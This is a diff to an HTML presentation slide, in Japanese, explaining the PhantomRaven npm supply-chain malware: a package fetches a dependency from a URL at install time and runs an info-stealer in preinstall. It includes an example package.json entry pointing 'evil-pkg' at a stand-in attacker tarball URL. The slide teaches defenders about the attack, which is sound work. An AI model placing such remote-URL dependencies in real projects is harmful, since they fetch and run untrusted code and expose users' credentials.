@@ -26,7 +26,8 @@
     .slide p { margin: 0; text-wrap: pretty; }
     .slide code { font-family: var(--font-mono); }
     .slide strong { color: var(--color-accent); }
-    .cols { display: grid; grid-template-columns: 420px 1fr; gap: 32px; align-items: center; }
+    .cols { display: grid; grid-template-columns: 1fr auto; gap: 32px; align-items: center; }
+    .left .name a { color: inherit; }
     .left { display: flex; flex-direction: column; gap: 16px; }
     .left .name { font-size: var(--text-h2); font-weight: 700; }
     .left .step { color: var(--color-muted); }
@@ -42,8 +43,7 @@
   <h1>誰も気付かなかったら？</h1>
   <div class="cols">
     <div class="left">
-      <p class="name">PhantomRaven</p>
-      <p class="step">依存先を URL で書く</p>
+      <p class="name"><a href="https://www.sonatype.com/blog/phantomraven-npm-malware">PhantomRaven</a></p>
       <p class="step">install 時に URL から package を取得<br>preinstall で InfoStealer 起動</p>
       <p class="result">→ 2か月以上気付かれなかった</p>
     </div>
@@ -52,7 +52,7 @@
 <pre>{
   "dependencies": {
     "evil-pkg":
-      "<span class="url">https://attacker.example.com/evil-pkg.tgz</span>"
+      "<span class="url">https://example.com/evil-pkg.tgz</span>"
   }
 }</pre>
     </div>
